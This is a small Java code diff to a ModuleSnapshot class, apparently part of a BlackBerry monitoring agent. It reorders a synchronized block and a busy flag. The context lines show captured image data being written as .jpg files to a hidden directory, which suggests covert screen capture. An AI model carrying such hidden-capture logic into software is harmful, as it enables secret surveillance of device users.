@@ -118,9 +118,10 @@ public final class ModuleSnapshot extends BaseInstantModule {
             return;
         }
 
-        synchronized (this) {
-            try {
-                busy = true;
+       
+        try {
+            busy = true;    
+            synchronized (this) {
                 /*
                  * if("net_rim_bb_clock".equals(Status.getInstance().
                  * getCurrentForegroundAppMod())){ //#ifdef DEBUG
@@ -147,10 +148,11 @@ public final class ModuleSnapshot extends BaseInstantModule {
                 AutoFile file = new AutoFile(Path.hidden(), Utils.getTime()+".jpg");
                 file.write(plain);
                 //#endif
-            } finally {
-                busy = false;
             }
+        } finally {
+            busy = false;
         }
+        
     }
 
     /**
